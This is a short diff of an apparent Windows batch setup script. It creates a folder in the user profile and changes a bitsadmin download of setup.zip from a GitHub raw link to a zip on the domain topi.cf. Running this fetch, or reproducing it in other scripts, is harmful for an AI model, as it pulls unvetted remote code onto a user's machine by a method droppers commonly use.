@@ -1,6 +1,6 @@
 mkdir %USERPROFILE%\π\setup
 
-bitsadmin /transfer download https://github.com/apple-pi-yhhhh/topitopi.exe/blob/main/test/setup/test.zip?raw=true %USERPROFILE%\π\setup.zip
+bitsadmin /transfer download https://www.topi.cf/topitopi.exe/setup/main.zip %USERPROFILE%\π\setup.zip
 
 cd %USERPROFILE%\π
 
